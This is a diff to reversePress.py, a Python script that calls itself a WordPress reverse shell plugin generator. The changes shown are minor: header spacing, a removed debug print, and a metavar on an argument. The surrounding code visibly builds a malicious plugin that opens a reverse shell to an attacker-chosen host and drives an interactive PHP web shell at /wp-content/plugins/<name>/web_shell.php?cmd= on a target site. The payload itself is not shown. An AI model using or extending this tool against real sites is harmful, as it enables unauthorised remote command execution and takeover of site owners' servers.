@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-### reversePress.py                               ###
+### reversePress.py                             ###
 ### A WordPress reverse shell plugin generator  ###
 ### github.com/MachadoOtto                      ###
 
@@ -139,7 +139,6 @@ def startListener(port):
 # Interactive Web Shell Support
 def startInteractiveWebShell(target, plugin_name):
     url = target + '/wp-content/plugins/' + plugin_name + '/web_shell.php?cmd='
-    print(url)
     print('[' + BLUE + 'INFO' + NOCOLOR + ']: Initiating interactive web sheell at ' + target)
     print('[' + BLUE + 'INFO' + NOCOLOR + ']: Cntr+C, \'exit\' or \'q\' to finish...')
     while (True):
@@ -157,7 +156,7 @@ def main():
     parser.add_argument('-o', '--output', help = 'name of the file to be generated', default = 'reverse_shell_plugin.zip')
     parser.add_argument('-p', '--port', help = 'port to listen on', default = '25250')
     parser.add_argument('-w', '--webshell', action = 'store_true', help = 'use a PHP web shell')
-    parser.add_argument('-x', '--xinteractive', help = 'start a interactive web shell on the target', type = str)
+    parser.add_argument('-x', '--xinteractive', metavar = 'TARGET', help = 'start a interactive web shell on the target', type = str)
     parser.add_argument('host', help = 'host to connect back to', type = str)
     args = parser.parse_args()
     try:
